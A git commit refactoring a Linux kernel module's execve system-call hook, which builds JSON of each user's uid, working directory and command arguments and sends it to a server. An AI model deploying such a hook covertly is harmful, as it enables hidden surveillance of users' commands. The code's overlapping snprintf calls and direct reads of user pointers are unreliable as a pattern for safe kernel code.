5208eb66aefe7cb31a0e645e65f2fb2f936ea769
Brett Broadhurst <brettbroadhurst@gmail.com>
2021-02-21 13:33:15 -0800

    Refactoring

--- hooks/execve_hook.c
+++ hooks/execve_hook.c
@@ -14,13 +14,13 @@
 
 /* Current process data of the user. */
 struct user_data {
-   kuid_t unix_id;
-   char buffer[X_LEN];
-   char *cwd_path;
+    kuid_t unix_id;
+    char buffer[X_LEN];
+    char *cwd_path;
 };
 
 /* Get current process info */
-static void get_current_user_data(struct user_data *data) {
+static inline void get_current_user_data(struct user_data *data) {
     struct path pwd;
 
     /* Get the current working directory from the file system. */
@@ -31,15 +31,41 @@ static void get_current_user_data(struct user_data *data) {
     data->cwd_path = dentry_path_raw(pwd.dentry, data->buffer, X_LEN); /* linux/fs_struct.h */
 }
 
+/* Fill the JSON buffer with formatted JSON data from the current execution state. */
+static inline void set_json_buffer(
+        char *json_buffer,
+        size_t json_buffer_size,
+        int uid,
+        char *cwd,
+        char *filename,
+        char **argv)
+{
+    char **p_argv = (char **)argv; /* tmp pointer */
+
+    /* Copy uid and filename to the json_buffer */
+    snprintf(json_buffer, json_buffer_size,
+            "{\"uid\":%d,\"cwd\":\"%s\",\"filename\":\"%s\",\"command\":\"",
+            uid, cwd, filename);
+
+    /* Copy all execve argv elements to the JSON buffer. */
+    p_argv = (char **)argv;
+    while (*p_argv != NULL) {
+        snprintf(json_buffer, json_buffer_size, "%s%s ", json_buffer, *p_argv);
+        (char **)p_argv++;
+    }
+
+    /* Close off the JSON buffer. */
+    snprintf(json_buffer, json_buffer_size, "%s\"}\n", json_buffer);
+}
+
 /* execve system call hook via ptregs. */
 asmlinkage int execve_hook(const struct pt_regs *regs)
 {
-    #define JSON_SIZE DEFAULT_BUFFER_SIZE
+#define JSON_SIZE DEFAULT_BUFFER_SIZE
     /* System call arguments */
     ptregs_syscall_hook_t sys_execve;         /* Original syscall      */
     char __user *filename = (char *)regs->di; /* first arg of syscall  */
     char __user **argv = (char **)regs->si;   /* second arg of syscall */
-    char **p_argv = (char **)argv;            /* tmp pointer           */
     struct user_data c_user_data;             /* current user data     */
     char *json_buffer = NULL;                 /* json buffer to send   */
     size_t json_buffer_size = JSON_SIZE;      /* json buffer size      */
@@ -65,22 +91,10 @@ asmlinkage int execve_hook(const struct pt_regs *regs)
     /* Clear the json buffer. */
     memset(json_buffer, 0, json_buffer_size);
 
-    /* Copy uid and filename to the json_buffer */
-    snprintf(json_buffer, json_buffer_size,
-            "{\"uid\":%d,\"cwd\":\"%s\",\"filename\":\"%s\",\"command\":\"",
-            c_user_data.unix_id.val,
-            c_user_data.cwd_path,
-            filename);
-
-    /* Copy all execve argv elements to the JSON buffer. */
-    p_argv = (char **)argv;
-    while (*p_argv != NULL) {
-        snprintf(json_buffer, json_buffer_size, "%s%s ", json_buffer, *p_argv);
-        (char **)p_argv++;
-    }
-
-    /* Close off the JSON buffer. */
-    snprintf(json_buffer, json_buffer_size, "%s\"}\n", json_buffer);
+    /* Set the JSON buffer to be sent. */
+    set_json_buffer(json_buffer, json_buffer_size,
+            c_user_data.unix_id.val, c_user_data.cwd_path,
+            filename, argv);
 
     /* Send off the JSON buffer. */
     server_send(json_buffer, json_buffer_size);
